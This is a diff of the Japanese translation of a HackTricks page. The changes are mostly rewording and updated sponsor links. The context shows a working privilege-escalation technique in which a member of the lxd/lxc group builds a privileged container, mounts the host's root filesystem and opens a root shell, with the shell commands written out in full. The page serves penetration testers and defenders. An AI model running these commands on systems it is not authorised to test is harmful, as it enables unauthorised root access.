@@ -2,25 +2,25 @@
 
 <details>
 
-<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong> で **ゼロからヒーローまでAWSハッキングを学ぶ**</a><strong>!</strong></summary>
+<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong> で **ゼロからヒーローまでのAWSハッキングを学ぶ**！</summary>
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする**
-* **ハッキングトリックを共有する**には、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に **参加** または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) を **フォロー** してください。
+* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して **ハッキングテクニックを共有** してください。
 
 </details>
 
 もし _**lxd**_ **または** _**lxc**_ **グループに所属している場合、root 権限を取得できます**
 
-## インターネットなしでの悪用
+## インターネットなしでの攻撃
 
 ### 方法1
 
-あなたのマシンにこのディストロビルダーをインストールすることができます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder) (githubの手順に従ってください):
+あなたのマシンにこの distro builder をインストールすることができます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder) (github の指示に従ってください):
 ```bash
 sudo su
 #Install requirements
@@ -38,7 +38,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-**lxd.tar.xz** と **rootfs.squashfs** ファイルをアップロードし、イメージをリポジトリに追加してコンテナを作成してください:
+**lxd.tar.xz** と **rootfs.squashfs** のファイルをアップロードし、イメージをリポジトリに追加してコンテナを作成します:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,11 +54,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-このエラーが見つかった場合 _**Error: No storage pool found. Please create a new storage pool**_\
-**`lxd init`** を実行して、前のコマンドチャンクを**繰り返して**ください
+もしエラー「_**Error: No storage pool found. Please create a new storage pool**_」が見つかった場合は、**`lxd init`** を実行して、前のコマンドチャンクを**繰り返して**ください。
 {% endhint %}
 
-最後に、コンテナを実行して root 権限を取得できます：
+最後に、コンテナを実行してroot権限を取得できます：
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -66,7 +65,7 @@ lxc exec privesc /bin/sh
 ```
 ### 方法2
 
-Alpineイメージをビルドし、`security.privileged=true`フラグを使用して起動します。これにより、コンテナがホストファイルシステムとしてrootとして対話するように強制されます。
+Alpineイメージをビルドし、`security.privileged=true`フラグを使用して起動します。これにより、コンテナがホストファイルシステムとしてrootとして相互作用するように強制されます。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -90,9 +89,11 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
-## インターネットを使用する
+Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
 
-[これらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
+## インターネットを使用する場合
+
+[こちらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
 ```bash
 lxc init ubuntu:16.04 test -c security.privileged=true
 lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
@@ -114,7 +115,7 @@ HackTricks をサポートする他の方法:
 * **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする
-* **ハッキングテクニックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
+* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
